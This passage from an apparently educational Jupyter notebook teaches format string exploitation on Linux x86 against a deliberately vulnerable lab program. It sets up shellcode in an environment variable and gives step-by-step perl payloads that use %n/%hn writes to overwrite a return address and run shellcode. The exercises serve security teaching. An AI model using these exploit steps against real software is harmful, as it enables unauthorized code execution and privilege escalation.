    "- ability to overwrite any arbitrary address opens up many possiblilites for exploitation\n",
    "- any section of writable memory that contains an address that directs the flow of program execution can be targeted"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 97,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./booksrc/shellcodex86linuxexec ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 98,
   "metadata": {},
   "outputs": [],
   "source": [
    "# create SHELLCODE env variable\n",
    "! export SHELLCODE=$(cat shellcodex86linuxexec)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 100,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SHELLCODE will be at 0x4\r\n"
     ]
    }
   ],
   "source": [
    "# get the address of SHELLCODE variable\n",
    "# run it in terminal if you do not see complete address!\n",
    "! ./getenvaddr.exe SHELLCODE ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exercise 1\n",
    "- stash your shellcode in shell environment and and exploit the `format string` vulnerability in fmt_vuln2.c to execute the shellcode by modifying the return address to the shellcode in environment.\n",
    "### steps:\n",
    "- stash your shellcode in shell environment\n",
    "- find the address of shellcode using getenvaddr program\n",
    "- find the nth parameter that'll crash fmt_vuln2 program\n",
    "```\n",
    "$ perl -e 'print \"AAAA%x%x%x%x%x%x%x\"' | ./fmt_vuln2.exe \n",
    "$ perl -e 'print \"AAAA%x%x%x%x%x%x%7\\$x\"' | ./fmt_vuln2.exe\n",
    "$ perl -e 'print \"return address%7\\$n\"' | ./fmt_vuln2.exe\n",
    "$ perl -e 'print \"two return addresses%widthx%7\\$hn%widthx%8\\$hn' | ./fmt_vuln2.exe\n",
    "```\n",
    "- doing some math, update the return address using half-write with shellcode address"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exercise 2\n",
    "- Smuggle your `shellcode` as a part of data into the program and exploit the `format string` vulnerability in fmt_vuln2.c program found in this repo by modifying the return address to point to the exploit code.\n",
    "### steps\n",
    "\n",
    "```\n",
    "- compile and make fmt_vuln2.c program a privileged program\n",
    "- run the program to note the return address and the address of input buffer\n",
    "- create an exploit file with 12 (not sled) + 24 (shellcode) bytes it makes it easier if the total bytes is multiple of 4\n",
    "$ perl -e 'print \"\\x90\"x12' > fmt_vuln2exploit.txt\n",
    "$ cat shellcode.bin >> fmt_vuln2exploit.txt\n",
    "$ wc - c fmt_vuln2exploit.txt\n",
    "- find out the parameter count where AAAA repeats\n",
    "$ ./fmt_vuln2.exe $(cat fmt_vuln2exploit.txt)$(perl -e 'print \"AAAA%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x\"')\n",
    "$ ./fmt_vuln2.exe $(cat fmt_vuln2exploit.txt)$(perl -e 'print \"AAAA%x%x%x%x%x%x%x%x%x%x%x%x%x%x%15\\$x\"')\n",
    "$ ./fmt_vuln2.exe $(cat fmt_vuln2exploit.txt)$(perl -e 'print \"AAAA%15\\$x\"')\n",
    "- now find the width parameter to write the address of input buffer at the return address\n",
    "$ echo $((0xf057-36-8)) # exploit-return add =>61483\n",
    "$ echo $((0x1bfff-0xf057)) # -> 53160\n",
    "$ ./fmt_vuln2.exe $(cat fmt_vuln2exploit.txt)$(perl -e 'print \"\\xcc\\xec\\xff\\xbf\\xce\\xec\\xff\\xbf%61483x%15\\$n%53160x%16\\$hn\"')\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
